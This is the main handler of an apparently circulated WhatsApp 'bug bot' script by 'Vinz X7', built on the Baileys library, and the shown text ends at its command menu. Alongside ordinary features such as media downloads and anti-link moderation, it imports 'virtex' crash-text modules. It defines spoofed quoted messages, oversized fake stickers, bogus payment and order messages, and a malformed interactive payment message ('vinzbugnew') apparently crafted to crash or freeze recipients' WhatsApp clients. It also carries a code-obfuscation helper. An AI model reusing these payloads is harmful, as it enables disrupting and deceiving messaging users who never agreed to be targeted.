//
//⛛BOT BY Vinz X7⛛
//
//This Script Is Strictly Forbidden To Attack Innocent People
//Este guión tiene estrictamente prohibido atacar a personas inocentes
//هذا البرنامج النصي ممنوع منعا باتا مهاجمة الأشخاص الأبرياء
//Es ist diesem Skript strengstens untersagt, unschuldige Personen anzugreifen
//Script Ini Dilarang Keras Untuk Serang Orang Yang Tidak Bersalah
//
//REUP MINIMAL TARO CREDIT GUA : Vinz X7
//استرداد الحد الأدنى من رصيد القلقاس أنا أكون: Vinz X7
//VOLVER A CARGAR MI INSTALACIÓN CREADIT: Vinz X7
//Reupload Give My Name On Credit: Vinz X7
//
//⛛THXTO⛛
//⛛Vinz X7
//⛛HW MODS WA
//⛛RXHL
//⛛HANZ OFC
//⛛RIZ MODS
//ALL CREATOR BOT
//ALL SEPUH🗿


require('./rizkill')
require('./media/teks/antibug')
require('./media/teks/antivietex')
require('./media/teks/rulesbot')
require('./media/teks/rules1')
require('./media/virtex/teksy')
require('./media/virtex/vinzmod')
require('./media/virtex/finetroy')
require('./media/virtex/cttl')
require('./media/virtex/buttonkal')
require('./media/menu/ceca')
require('./media/virtex/bugui')
require('./media/virtex/antigay')
require('./media/virtex/ios1')
require('./media/virtex/ios2')
require('./media/teks/credits')
require('./media/virtex/mdelay')


const {
	getGroupAdmins,
	jsonformat,
	runtime,
	fetchJson,
	generateProfilePicture,
	parseMention,
	tanggal,
	getBuffer,
	sleep
} = require('./media/function')
const { proto, prepareWAMessageMedia, MessageType, downloadContentFromMessage, generateWAMessageFromContent, generateMessageID } = require("@whiskeysockets/baileys")
module.exports = vinz = async (vinz, m, chatUpdate, store) => { try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const isCmd = body.startsWith(prefix)
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const type = Object.keys(m.message)[0];
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const full_args = body.replace(command, '').slice(1).trim()
const botId = await vinz.decodeJid(vinz.user.id)
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const moment = require("moment-timezone")
const { writeFile } = require('fs/promises')
const jsobfus = require('javascript-obfuscator')
const { exec, spawn } = require("child_process")
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { remini } = require('./lib/remini')
const { apikey } = require('./apikey.json')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const ytdl = require("ytdl-core")
const tanggalvinz = moment().tz("Asia/Jakarta").format("ll")
const ffmpegkntl = require("fluent-ffmpeg")
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const botNumber = botId.split('@')[0]
const ownId = ownNumb.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const ownNumber = ownNumb.replace(/[^0-9]/g, '')
const dtext = args.join(" ")
const creator = [`62881010004048`]
const welcm = m.isGroup ? wlcm.includes(m.chat) : true
const welcmm = m.isGroup ? wlcmm.includes(m.chat) : true
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const owner = JSON.parse(fs.readFileSync('./premium.json'))
const AntiLink = m.isGroup ? ntilink.includes(m.chat) : false
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const autodelete = m.chat && isCmd ? antidel.includes(m.chat) : false 
const quoted = m.quoted ? m.quoted: m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await vinz.groupMetadata(m.chat).catch(e => {}): ''
const groupName = m.isGroup ? groupMetadata.subject: ''
const participants = m.isGroup ? await groupMetadata.participants: ''
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const groupAdmins = m.isGroup ? await getGroupAdmins(participants): ''
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender): false
const isBotGroupAdmins = m.isGroup ? groupAdmins.includes(botId): false
const numberQuery = m.text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const coman = m.text.replace(new RegExp("[()+-/ +/]", "gi"), "")
const mentionByTag = m.type == "extendedTextMessage" && message.extendedTextMessage.contextInfo != null ? message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : dtext ? numberQuery : false
const content = JSON.stringify(m.message)
const isUser = pengguna.includes(m.sender)
var isAuthor = autOwn.replace(/[^0-9]/g, '').includes(m.sender.split("@")[0])
var isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
var isMe = botId.includes(m.sender)
var isCreator = isOwner || isAuthor || isMe

const reply = (text) => {
	vinz.sendMessage(m.chat, {text: text.toString()}, {quoted: m})}
	
	const replyz = (text) => {
	vinz.sendMessage(m.chat, {text: text.toString()}, {quoted: qpay})}
	
const replyyyyyy = (text) => {
	vinz.sendMessage(m.chat, {text: text.toString()})}

const thumb = fs.readFileSync('./media/image/vinz.jpg')

const thumbx = fs.readFileSync('./fefek/hinachan.jpg')

const thumb0 = fs.readFileSync('./media/image/botvinz.jpg')

const xxtmage = fs.readFileSync('./xxtimage.jpg')

const xxtmages = fs.readFileSync('./media/image/xxtimage.webp')

const egao = fs.readFileSync('./fefek/egao.jpg')

const xxtmagev1 = fs.readFileSync('./imagebot.jpg')

const kontol = fs.readFileSync('./vinzprem.jpg')

const vinzganz = fs.readFileSync('./media/video/vinzx7.mp4')

const xmenu = fs.readFileSync('./media/video/xmenu.mp4')

const getFileDownload = async(mediakey, MediaType) => {
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}
const IsQuoted = m.message.extendedTextMessage? m.message.extendedTextMessage.matchedText? false : m.message.extendedTextMessage.contextInfo.quotedMessage? true : false : false 
mQuotedMsg = IsQuoted? m.message.extendedTextMessage.contextInfo.quotedMessage : null

const getRandom =  (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log('Download Audio With ytdl-core')
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await vinz.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log('Download Video With ytdl-core')
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await vinz.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const replygc = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${pushname}`, "body": `👋🏻 Hai kak ${pushname} ${ucapanWaktu}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/b9f48c6e0b63b6173df9c.jpg', "sourceUrl": `https://chat.whatsapp.com/DWuXHxMRK3G56DbpvuezIf`}}}, { quoted: fgclink})}

const replycall = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${pushname}`, "body": `👋🏻 Hai kak ${pushname} ${ucapanWaktu}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/02f5474448116145e5653.jpg', "sourceUrl": `https://call.whatsapp.com/video/vinzx7-GfkdiJvsoOp`}}}, { quoted: m})}

const replycallv1 = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${pushname}`, "body": `👋🏻 Hai kak ${pushname} ${ucapanWaktu}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/02f5474448116145e5653.jpg', "sourceUrl": `https://call.whatsapp.com/voice/Vinz Sayang Selvi`}}}, { quoted: m})}

const replycard = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${pushname}`, "body": `👋🏻 Hai kak ${pushname} ${ucapanWaktu}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/02f5474448116145e5653.jpg', "sourceUrl": `https://wa.me/p/7017012558316979/62881010004048`}}}, { quoted: m})}

const replygclu = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${pushname}`, "body": `👋🏻 Hai kak ${pushname} ${ucapanWaktu}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/b9f48c6e0b63b6173df9c.jpg', "sourceUrl": `${gclu}`}}}, { quoted: qpay})}

const replg = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${pushname}`, "body": `👋🏻 Hai kak ${pushname} ${ucapanWaktu}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/b9f48c6e0b63b6173df9c.jpg', "sourceUrl": `${gclu}`}}}, { quoted: m})}

const replywalu = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`, "body": `${ucapanWaktu} ${pushname}`, "previewType": "PHOTO", "thumb": thumb0, "thumbnailUrl": 'https://telegra.ph/file/02f5474448116145e5653.jpg', "sourceUrl": `${wame}`}}}, { quoted: fkontak})}

const replyv1 = (teks) => {
vinz.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`, "body": `${ucapanWaktu} ${pushname}`, "previewType": "PHOTO", "thumb": xxtmagev1, "thumbnailUrl": 'https://telegra.ph/file/02f5474448116145e5653.jpg', "sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`}}}, { quoted: m})}

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Sore'
}
if(time2 < "03:40:00"){
var ucapanWaktu = 'Jangan Lupa Sahur'
}
if(time2 < "04:10:00"){
var ucapanWaktu = 'Udah Imsak Kak'
}
if(time2 < "04:20:00"){
var ucapanWaktu = 'Sholat Subuh Kak'
}
if(time2 < "05:59:00"){
var ucapanWaktu = 'Sholat Duha Kak'
}
if(time2 < "11:44:00"){
var ucapanWaktu = 'Sholat Dzuhur Kak'
}
if(time2 < "14:47:00"){
var ucapanWaktu = 'Sholat Ashar Kak'
}
if(time2 < "17:56:00"){
var ucapanWaktu = 'Sholat Magrib Kak'
}
if(time2 < "17:55:00"){
var ucapanWaktu = 'Buka Puasa Kak'
}
if(time2 < "18:55:00"){
var ucapanWaktu = 'Sholat Isya Kak'
}
if(time2 < "18:00:00"){
var ucapanWaktu = 'Sore'
}
if(time2 < "15:00:00"){
var ucapanWaktu = 'Siang'
}
if(time2 < "10:00:00"){
var ucapanWaktu = 'Pagi 🌄'
}
if(time2 < "05:00:00"){
var ucapanWaktu = 'Pagi'
}
if(time2 < "03:00:00"){
var ucapanWaktu = 'Malam'
}

const ftextt = {
    key: {
Me: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
  remoteJid: "6285600793871-1614953337@g.us"
} : {})
    },
    message: {
"extendedTextMessage": {
  "text": `${botname}`,
  "title": `${botname}`,
  'jpegThumbnail': xxtmagev1,
}
    }
}

const dcreply = (text) => {
    vinz.sendMessage(m.chat, { 
        document: fs.readFileSync('./media/fake.doc'),
        fileName: '👋Hai, '+pushname,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 99999999999999,
        pageCount: "100",
        caption: text.toString(),
        contextInfo: {
	        externalAdReply: {
    	        title: `${pushname}`,
    	        body: `${isCreator ? 'Hai UserPrem 😝' : 'UserFree'}`,
    	        thumbnail: thumb,
    	        renderLargerThumbnail: false,
    	        mediaType: 1,
    	        sourceUrl: 'https://youtube.com/@VinzX7'
	        }
	    }
    }, { quoted: m }).catch((err) => replyv1(err))
}

const troli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid :"6285600793871-1614953337@g.us" }: {})},
 message:{"orderMessage":{"orderId":"174238614569438",
 "thumbnail":xxtmagev1, //image 0kb
 "itemCount":2023,
 "status":"INQUIRY","surface":"CATALOG","message":`${botname}`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender, "forwardingScore":999,"isForwarded":true}}
 
 const trolibg = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid :"6285600793871-1614953337@g.us" }: {})},
 message:{"orderMessage":{"orderId":"174238614569438",
 "thumbnail":xxtmagev1, //image 0kb
 "itemCount":99999999999999999,
 "status":"INQUIRY","surface":"CATALOG","message":`${vonzx}`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender, "forwardingScore":999,"isForwarded":true}}

const ftextt1 = {
    key: {
Me: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
  remoteJid: "status@broadcast"
} : {})
    },
    message: {
"extendedTextMessage": {
  "text": `${botname}`,
  "title": `${botname}`,
  'jpegThumbnail': thumb,
}
    }
}

const fvn = {
    key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
  remoteJid: "6285600793871-1614953337@g.us"
} : {})
    },
    message: {
"audioMessage": {
  "mimetype": "audio/ogg; codecs=opus",
  "seconds": 999999,
  "ptt": "true"
}
    }
}


const fgclink = {
    key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
    },
    "message": {
"groupInviteMessage": {
  "groupJid": "120363144890087799@g.us",
  "inviteCode": "m",
  "groupName": `XXT CORPORATION`,
  "caption": `${botname}`,
  'jpegThumbnail': thumb,
}
    }
}

const qpay = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: '0@s.whatsapp.net',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: 'USD',
			amount1000: 2,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: 'INR'
			}
		}
	}
};

const fkontak = {
    key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
  remoteJid: `6285600793871-1614953337@g.us`
} : {})
    },
    message: {
'contactMessage': {
  'displayName': `${pushname}`,
  'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${senderNumber}:${senderNumber}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
  'jpegThumbnail': thumb,
  thumbnail: thumb0,
  sendEphemeral: true
}
    }
}
const replyx = (teks) => { 
vinz.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "𝗫𝗫𝗧 𝗕𝗢𝗧𝗭", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": thumbx, 
"mediaUrl": "https://telegra.ph/file/c70fe0d92876c6fd21435.jpg", 
"sourceUrl": `${gclu}` }}}, { quoted: m }) }

const ftoko = {
    key: {
Me: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
  remoteJid: "6285600793871-1614953337@g.us"
} : {})
    },
    message: {
"productMessage": {
  "product": {
"productImage": {
    "mimetype": "image/jpeg",
    "jpegThumbnail": thumb,
},
"title": `${botname}`,
"description": `${ucapanWaktu} Kak ${pushname}\nWaktu : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} `,
"currencyCode": "RP",
"priceAmount1000": "1000000000000000000",
"retailerId": `Vinz X7`,
"productImageCount": 1
  },
  "businessOwnerJid": `0@s.whatsapp.net`
}
    }
}

const fdoc = {
    key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
  remoteJid: `6285600793871-1614953337@g.us`
} : {})
    },
    message: {
documentMessage: {
  title: `${botname}`,
  jpegThumbnail: thumb,
}
    }
}

const floc = {
    key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
  remoteJid: `status@broadcast`
} : {})
    },
    message: {
locationMessage: {
  name: `${botname}`,
  jpegThumbnail: thumb,
}
    }
}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 90,
"width": 30,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "999999999999999",
"mediaKeyTimestamp": "16572901099967899999",
        'isAnimated': []
}}}

const vinzsticker = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},
'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

const vinzbugnew = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": xxtmage,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"💀💀💀💀\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}



 const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };

const reactionMessage = require("@whiskeysockets/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "🤖" })

const isMedia = type === "imageMessage" || type === "videoMessage";
const isQuotedImage =
type === "extendedTextMessage" && content.includes("imageMessage");
const isQuotedVideo =
type === "extendedTextMessage" && content.includes("videoMessage");
const isQuotedAudio =
type === "extendedTextMessage" && content.includes("audioMessage");
const isQuotedSticker =
type === "extendedTextMessage" && content.includes("stickerMessage");

async function loading () {
var vinzx7 = [
`*🕛 _Loading..._*
*▰▱▱▱▱▱▱▱*`,
`*🕑 _Loading..._*
*▰▰▰▱▱▱▱▱*`,
`*🕒 _Loading..._*
*▰▰▰▰▱▱▱▱*`,
`*🕧 _Loading..._*
*▰▰▰▰▰▱▱▱*`,
`*🕘 _Loading..._*
*▰▰▰▰▰▰▱▱*`,
`*🕛 _Loading..._*
*▰▰▰▰▰▰▰▰*`,
"𝙻𝚘𝚊𝚍𝚒𝚗𝚐 𝙱𝚎𝚛𝚑𝚊𝚜𝚒𝚕"
]
let { key } = await vinz.sendMessage(m.chat, {text: '_*𝙿𝚕𝚎𝚊𝚜𝚎 𝚠𝚊𝚒𝚝..*_'})//Pengalih isu

for (let i = 0; i < vinzx7.length; i++) {
/*await delay(10)*/
await vinz.sendMessage(m.chat, {text: vinzx7[i], edit: key });//PESAN LEPAS
}
}

// Function Obsufcator//
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Xyz-MD`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
async function downloadAndSaveMediaMessage (type_file, path_file) {
if (type_file === 'image') {
var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
fs.writeFileSync(path_file, buffer)
return path_file } 
else if (type_file === 'video') {
var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk]) }
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'sticker') {
var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file
} else if (type_file === 'audio') {
var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync(path_file, buffer)
return path_file}
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\\
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isCreator ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\\

if (command) {
	vinz.readMessages([m.key])
	let rn = ['recording']
    let jd = rn[Math.floor(Math.random() * rn.length)];
    vinz.sendPresenceUpdate(jd, m.chat)
	console.log(`${m.isGroup ? '\x1b[0;32mGC\x1b[1;32m-CMD' : '\x1b[1;32mPC-CMD'} \x1b[0m[ \x1b[1;37m${command} \x1b[0m] at \x1b[0;32m${calender}\x1b[0m\n› ${m.chat}\n› from; \x1b[0;37m${m.sender.split('@')[0]}\x1b[0m${m.pushName ? ', '+m.pushName : ''}\n› in; \x1b[0;32m${m.isGroup ? groupName : 'Personal Chat'}\x1b[0m`)
}
//runtime berjalan
           runi = process.uptime() 
           vinz.updateProfileStatus(`I am ${botname} | Aktif Selama ${runtime(runi)} ⏳ | Mode : ${vinz.public ? 'Public-Mode' : 'Self-Mode'}`).catch((_)=>_);

           settingstatus = new Date() * 1;
//auto delete
if (autodelete) {
vinz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: true,
id: mek.key.id,
participant: mek.key.participant
}
})
}
//antilink meks
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotGroupAdmins) return reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await vinz.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return vinz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return vinz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return vinz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await vinz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
vinz.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
if (!vinz.public) {
if (!isCreator) return
}



switch (command) {

case 'menu': case 'help':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚙𝚞𝚋𝚕𝚒𝚌/𝚜𝚎𝚕𝚏
📄 ${prefix}𝚌𝚎𝚔𝚙𝚛𝚎𝚖
📄 ${prefix}𝚊𝚕𝚕𝚖𝚎𝚗𝚞
📄 ${prefix}𝚘𝚠𝚗𝚎𝚛𝚖𝚎𝚗𝚞
📄 ${prefix}𝚐𝚛𝚘𝚞𝚙𝚖𝚎𝚗𝚞
📄 ${prefix}𝚜𝚝𝚘𝚛𝚎𝚖𝚎𝚗𝚞
📄 ${prefix}𝚜𝚎𝚊𝚛𝚌𝚑𝚖𝚎𝚗𝚞
📄 ${prefix}𝚋𝚎𝚛𝚒𝚝𝚊𝚖𝚎𝚗𝚞
📄 ${prefix}𝚙𝚞𝚜𝚑𝚖𝚎𝚗𝚞
📄 ${prefix}𝚗𝚜𝚏𝚠𝚖𝚎𝚗𝚞
📄 ${prefix}𝚏𝚞𝚗𝚖𝚎𝚗𝚞
📄 ${prefix}𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍𝚖𝚎𝚗𝚞
